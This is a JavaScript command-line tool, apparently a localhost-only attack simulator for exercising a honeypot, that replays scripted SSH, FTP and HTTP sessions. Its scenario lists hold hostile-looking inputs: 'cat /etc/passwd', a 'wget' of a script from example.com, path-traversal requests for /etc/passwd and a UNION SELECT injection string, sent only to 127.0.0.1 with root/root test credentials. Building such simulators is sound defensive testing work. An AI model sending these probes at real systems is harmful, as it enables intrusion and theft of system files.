import net from "node:net";
import { fileURLToPath } from "node:url";

export const ALLOWED_HOST = "127.0.0.1";
export const PORTS = { ssh: 2222, http: 8080, ftp: 2121 };
export const WGET_URL = "http://example.com/x.sh";
export const TEST_SSH_USER = "root";
export const TEST_SSH_PASSWORD = "root";

const BASIC_SSH = [
  { protocol: "ssh", display: "whoami", command: "whoami" },
  { protocol: "ssh", display: "ls", command: "ls" },
  { protocol: "ssh", display: "pwd", command: "pwd" },
  { protocol: "ssh", display: "exit", command: "exit" },
];
const ADVANCED_SSH = [
  { protocol: "ssh", display: "whoami", command: "whoami" },
  { protocol: "ssh", display: "cat", command: "cat /etc/passwd" },
  { protocol: "ssh", display: "ps", command: "ps" },
  { protocol: "ssh", display: `wget ${WGET_URL}`, command: `wget ${WGET_URL}` },
  { protocol: "ssh", display: "exit", command: "exit" },
];
const FTP_LIST = [
  { protocol: "ftp", display: "LIST /", verb: "LIST", arg: "/" },
  { protocol: "ftp", display: "LIST /backup", verb: "LIST", arg: "/backup" },
];
const HTTP_LOGIN = [
  { protocol: "http", display: "GET /wp-login.php", method: "GET", target: "/wp-login.php", body: "" },
  { protocol: "http", display: "POST /wp-login.php", method: "POST", target: "/wp-login.php", body: "log=admin&action=login" },
];
const HTTP_TRAVERSAL = [
  { protocol: "http", display: "GET /../../etc/passwd", method: "GET", target: "/../../etc/passwd", body: "" },
  { protocol: "http", display: "GET /%2e%2e%2f%2e%2e%2fetc%2fpasswd", method: "GET", target: "/%2e%2e%2f%2e%2e%2fetc%2fpasswd", body: "" },
  { protocol: "http", display: "GET /search?q=%27%20UNION%20SELECT%201%2C2--", method: "GET", target: "/search?q=%27%20UNION%20SELECT%201%2C2--", body: "" },
];
export const SCENARIOS = {
  "basic-ssh": BASIC_SSH,
  "advanced-ssh": ADVANCED_SSH,
  "ftp-list": FTP_LIST,
  "http-login": HTTP_LOGIN,
  "http-traversal": HTTP_TRAVERSAL,
  mixed: [...BASIC_SSH, ...FTP_LIST, ...HTTP_LOGIN],
};
export const SCENARIO_NAMES = Object.keys(SCENARIOS);

export function validateTarget(host, port, allowedPorts = Object.values(PORTS)) {
  if (host !== ALLOWED_HOST) {
    throw new Error(`simulator target not allowed: ${host}`);
  }
  if (!allowedPorts.includes(port)) {
    throw new Error(`simulator port not allowed: ${port}`);
  }
}

export function resolveScenario(name) {
  if (name === "basic") return "basic-ssh";
  if (Object.prototype.hasOwnProperty.call(SCENARIOS, name)) return name;
  throw new Error(`unknown scenario: ${name}`);
}

export function buildRequestList(scenario, count = 1) {
  const name = resolveScenario(scenario);
  const single = SCENARIOS[name];
  const out = [];
  for (let i = 0; i < count; i += 1) {
    for (const request of single) out.push({ ...request });
  }
  return out;
}

export function displayRequest(request) {
  return `${request.protocol}: ${request.display}`;
}

export function requestPorts(requests, portMap = PORTS) {
  const ports = [];
  for (const request of requests) {
    const port = portMap[request.protocol];
    if (!ports.includes(port)) ports.push(port);
  }
  return ports;
}

export function formatSummary({ scenario, count, host, requests, sent, failed, ports = PORTS }) {
  const types = [];
  for (const request of requests) {
    const label = displayRequest(request);
    if (!types.includes(label)) types.push(label);
  }
  return [
    `scenario: ${scenario}`,
    `count: ${count}`,
    `host: ${host}`,
    `ports: ${requestPorts(requests, ports).join(", ")}`,
    `requests sent: ${sent}`,
    `requests failed: ${failed}`,
    `request types: ${types.join(", ")}`,
  ].join("\n");
}

export function formatDryRun(scenario, requests) {
  const lines = [`dry-run: ${scenario}`];
  for (const request of requests) lines.push(displayRequest(request));
  lines.push(`requests: ${requests.length}`);
  return lines.join("\n");
}

export function parseArgs(argv) {
  const options = { scenario: null, count: 1, delay: 1000, host: ALLOWED_HOST, list: false, dryRun: false };
  for (let i = 0; i < argv.length; i += 1) {
    const arg = argv[i];
    if (arg === "--list") options.list = true;
    else if (arg === "--dry-run") options.dryRun = true;
    else if (arg === "--scenario") {
      options.scenario = argv[i + 1];
      i += 1;
    } else if (arg === "--count") {
      options.count = Number.parseInt(argv[i + 1], 10);
      i += 1;
    } else if (arg === "--delay") {
      options.delay = Number.parseInt(argv[i + 1], 10);
      i += 1;
    } else if (arg === "--host") {
      options.host = argv[i + 1];
      i += 1;
    } else {
      throw new Error(`unknown argument: ${arg}`);
    }
  }
  if (!options.list && !options.scenario) throw new Error("scenario required, use --scenario or --list");
  if (!Number.isInteger(options.count) || options.count < 1) throw new Error("count must be a positive integer");
  if (!Number.isInteger(options.delay) || options.delay < 0) throw new Error("delay must be a non-negative integer");
  return options;
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function connectTcp(host, port, timeoutMs = 5000) {
  return new Promise((resolve, reject) => {
    const socket = net.connect(port, host);
    const timer = setTimeout(() => {
      socket.destroy();
      reject(new Error("connection timed out"));
    }, timeoutMs);
    socket.once("connect", () => {
      clearTimeout(timer);
      resolve(socket);
    });
    socket.once("error", (error) => {
      clearTimeout(timer);
      reject(error);
    });
  });
}

class LineReader {
  constructor(socket) {
    this.socket = socket;
    this.buffer = "";
    this.waiters = [];
    socket.on("data", (chunk) => {
      this.buffer += chunk.toString("utf8");
      this.flush();
    });
    socket.on("close", () => this.flush());
  }
  flush() {
    while (this.waiters.length > 0) {
      const index = this.buffer.indexOf("\r\n");
      if (index < 0) {
        if (this.socket.destroyed && this.buffer.length > 0) {
          const line = this.buffer;
          this.buffer = "";
          this.waiters.shift().resolve(line);
        }
        return;
      }
      const line = this.buffer.slice(0, index);
      this.buffer = this.buffer.slice(index + 2);
      this.waiters.shift().resolve(line);
    }
  }
  readLine(timeoutMs = 5000) {
    return new Promise((resolve, reject) => {
      const timer = setTimeout(() => reject(new Error("reply timed out")), timeoutMs);
      this.waiters.push({
        resolve: (line) => {
          clearTimeout(timer);
          resolve(line);
        },
      });
      this.flush();
    });
  }
  send(line) {
    this.socket.write(`${line}\r\n`);
  }
}

async function sendHttp(request, host, ports = PORTS) {
  const socket = await connectTcp(host, ports.http);
  socket.on("data", () => {});
  try {
    const body = request.body || "";
    const raw = `${request.method} ${request.target} HTTP/1.1\r\nHost: ${host}\r\nConnection: close\r\nContent-Length: ${Buffer.byteLength(body, "utf8")}\r\n\r\n${body}`;
    socket.write(raw);
    await new Promise((resolve) => {
      const timer = setTimeout(resolve, 5000);
      socket.once("close", () => {
        clearTimeout(timer);
        resolve();
      });
      socket.once("error", () => {
        clearTimeout(timer);
        resolve();
      });
    });
  } finally {
    socket.destroy();
  }
}

async function runFtpSession(requests, host, ports = PORTS) {
  const socket = await connectTcp(host, ports.ftp);
  const reader = new LineReader(socket);
  try {
    await reader.readLine();
    reader.send("USER anonymous");
    await reader.readLine();
    reader.send("PASS simulator@example.com");
    await reader.readLine();
    for (const request of requests) {
      reader.send("PASV");
      const pasv = await reader.readLine();
      const match = pasv.match(/\((\d+),(\d+),(\d+),(\d+),(\d+),(\d+)\)/);
      if (!match) throw new Error("passive mode reply not understood");
      const dataPort = Number.parseInt(match[5], 10) * 256 + Number.parseInt(match[6], 10);
      const dataSocket = await connectTcp(host, dataPort);
      const dataDone = new Promise((resolve, reject) => {
        const timer = setTimeout(() => {
          try { dataSocket.destroy(); } catch {}
          reject(new Error("data transfer timed out"));
        }, 5000);
        dataSocket.on("data", () => {});
        dataSocket.once("close", () => {
          clearTimeout(timer);
          resolve();
        });
        dataSocket.once("error", () => {
          clearTimeout(timer);
          resolve();
        });
      });
      reader.send(`${request.verb} ${request.arg}`);
      await reader.readLine();
      await dataDone;
      dataSocket.destroy();
      const done = await reader.readLine();
      if (!done.startsWith("226")) throw new Error("directory listing did not complete");
    }
    reader.send("QUIT");
    await reader.readLine();
  } finally {
    socket.destroy();
  }
}

async function runSshSession(commands, host, ports = PORTS) {
  let mod;
  try {
    mod = await import("ssh2");
  } catch {
    throw new Error("ssh client unavailable, live SSH simulation needs the system ssh client");
  }
  const Client = mod.Client || (mod.default && mod.default.Client);
  if (!Client) throw new Error("ssh client unavailable, live SSH simulation needs the system ssh client");
  await new Promise((resolve, reject) => {
    const conn = new Client();
    const timer = setTimeout(() => {
      try { conn.end(); } catch {}
      reject(new Error("ssh session timed out"));
    }, 15000);
    let finished = false;
    const finish = () => {
      if (finished) return;
      finished = true;
      clearTimeout(timer);
      try { conn.end(); } catch {}
      resolve();
    };
    conn.on("ready", () => {
      conn.shell((error, stream) => {
        if (error) {
          clearTimeout(timer);
          conn.end();
          reject(error);
          return;
        }
        stream.on("data", () => {});
        stream.on("close", finish);
        stream.on("error", finish);
        for (const command of commands) stream.write(`${command}\n`);
      });
    });
    conn.on("error", (error) => {
      clearTimeout(timer);
      reject(error);
    });
    conn.on("close", finish);
    conn.connect({ host, port: ports.ssh, username: TEST_SSH_USER, password: TEST_SSH_PASSWORD, readyTimeout: 5000 });
  });
}

export async function runScenario({ scenario, count, delay, host, ports = PORTS }) {
  const name = resolveScenario(scenario);
  const requests = buildRequestList(name, count);
  for (const request of requests) validateTarget(host, ports[request.protocol], Object.values(ports));
  let sent = 0;
  let failed = 0;
  let index = 0;
  while (index < requests.length) {
    const request = requests[index];
    const batch = [];
    while (index < requests.length && requests[index].protocol === request.protocol) {
      batch.push(requests[index]);
      index += 1;
    }
    try {
      if (request.protocol === "ssh") {
        await runSshSession(batch.map((item) => item.command), host, ports);
        sent += batch.length;
      } else if (request.protocol === "ftp") {
        await runFtpSession(batch, host, ports);
        sent += batch.length;
      } else {
        for (const item of batch) {
          try {
            await sendHttp(item, host, ports);
            sent += 1;
          } catch {
            failed += 1;
          }
        }
      }
    } catch {
      failed += batch.length;
    }
    if (index < requests.length && delay > 0) await sleep(delay);
  }
  return { scenario: name, count, host, requests, sent, failed, ports };
}

export async function runCli(argv, options = {}) {
  const ports = options.ports || PORTS;
  let cliOptions;
  try {
    cliOptions = parseArgs(argv);
  } catch (error) {
    console.error(error.message);
    return 1;
  }
  if (cliOptions.list) {
    for (const name of SCENARIO_NAMES) console.log(name);
    return 0;
  }
  let requests;
  try {
    requests = buildRequestList(cliOptions.scenario, cliOptions.count);
    for (const request of requests) validateTarget(cliOptions.host, ports[request.protocol], Object.values(ports));
  } catch (error) {
    console.error(error.message);
    return 1;
  }
  if (cliOptions.dryRun) {
    console.log(formatDryRun(resolveScenario(cliOptions.scenario), requests));
    return 0;
  }
  const result = await runScenario({ scenario: cliOptions.scenario, count: cliOptions.count, delay: cliOptions.delay, host: cliOptions.host, ports });
  console.log(formatSummary(result));
  return result.failed > 0 ? 1 : 0;
}

async function main(argv) {
  process.exitCode = await runCli(argv);
}

if (process.argv[1] && process.argv[1].endsWith("attack-simulator.js")) {
  main(process.argv.slice(2)).catch((error) => {
    console.error(error.message);
    process.exit(1);
  });
}
